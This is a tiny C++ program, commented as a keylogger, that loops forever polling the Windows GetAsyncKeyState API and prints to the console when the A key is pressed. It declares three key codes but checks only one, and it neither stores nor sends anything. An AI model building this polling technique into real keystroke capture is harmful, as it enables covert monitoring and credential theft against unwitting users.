// Keylogger built in C++

#include <iostream>
#include <windows.h>
 
int main() 
{
	while (1) 
	{
		Sleep(1);
		int vkeys[] = { 0x41, 0x42, 0x43 };
		int count = 0;
		for (int key : vkeys) 
		{
			if (key == 0x41) 
			{
				count += 1;
				if (GetAsyncKeyState(key) != 0) 
				{
					std::cout << "a";
					std::cout << count << std::endl;
				}
			}
		}
	}
}
